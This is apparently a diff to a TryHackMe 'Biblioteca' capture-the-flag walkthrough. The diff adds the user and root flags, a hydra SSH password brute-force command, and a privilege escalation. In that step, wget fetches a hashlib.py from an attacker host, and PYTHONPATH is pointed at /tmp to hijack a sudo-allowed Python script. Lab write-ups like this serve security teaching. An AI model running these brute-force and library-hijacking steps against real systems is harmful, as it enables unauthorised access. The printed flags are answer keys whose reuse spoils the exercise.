@@ -10,10 +10,8 @@ Click <a href="https://tryhackme.com/room/biblioteca">here </a>to access the "ro
 <h4 align="left"> Answer the questions below</h4>
 
 > 1.1. <em>What is the user flag?</em> Hint : <em>Weak password</em><br><a id='1.1'></a>
->> <strong><code>__________</code></strong><br>
+>> <strong><code>THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}</code></strong><br>
 <p></p>
-
-
 
 <h3>rustscan</h3>
 
@@ -124,27 +122,56 @@ Table: users
 <h3>hydra</h3>
 
 ```bash
-smokey@ip-10-10-229-62:/home$ ls
-hazel  smokey  ubuntu
-smokey@ip-10-10-229-62:/home$ 
-80/tcp open  http
+:~/Biblioteca# hydra -l 'hazel' -P /usr/share/wordlists/rockyou.txt biblioteca ssh -t 50
 ```
 
-
+![image](https://github.com/user-attachments/assets/088d15f8-5d97-4c3a-8301-90f61bfd81c8)
 
 ```bash
-:~# nmap -Pn -p- TargetIP
-...
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
+:~/Biblioteca# ssh hazel@biblioteca
 ```
 
+![image](https://github.com/user-attachments/assets/27f9b0c7-f0e9-4a7b-8d96-cff2989371a2)
+
+<h3>ssh</h3>
 
 ```bash
-:~# nmap -Pn -p- TargetIP
-...
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
+hazel@ip-10-10-229-62:~$ pwd
+/home/hazel
+hazel@ip-10-10-229-62:~$ ls
+hasher.py  user.txt
+hazel@ip-10-10-229-62:~$ cat user.txt
 ```
+
+![image](https://github.com/user-attachments/assets/ecf4c3eb-5ec2-4db3-a20f-5afc0fde8394)
+
+<h3>hasher.py</h3>
+
+![image](https://github.com/user-attachments/assets/617f6cf5-7419-49cf-a1ba-c046e7e30433)
+
+
+<h3>sudo -l</h3>
+
+![image](https://github.com/user-attachments/assets/8800d740-4235-4524-8cc5-04b90e0a64af)
+
+<p><code>hazel</code>code> can run <code>/usr/bin/python3 /home/hazel/hasher.py</code>code></p>
+
+![image](https://github.com/user-attachments/assets/ee75dbf0-d751-4a19-96b5-860ba8c10d1a)
+
+```bash
+hazel@ip-xx-xx-xxx-xx:/tmp$ wget http://AttackIP:8000/hashlib.py
+...
+hazel@ip-xx-xx-xxx-xx:/tmp$ chmod +x hashlibb.py
+hazel@ip-xx-xx-xxx-xx:/tmp$ chmod +x hashlib.py
+hazel@ip-xx-xx-xxx-xx:/tmp$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
+rootl@ip-xx-xx-xxx-xx:/tmp# ls /root
+root.txt  snap
+rootl@ip-xx-xx-xxx-xx:/tmp# cat /root/root.txt
+THM{PytH0n_LiBr@RY_H1j@acKIn6}
+rootl@ip-xx-xx-xxx-xx:/tmp# 
+```
+
+![image](https://github.com/user-attachments/assets/70282ae4-a393-475e-85de-135d6d40d6b2)
+
+<br>
+<br>
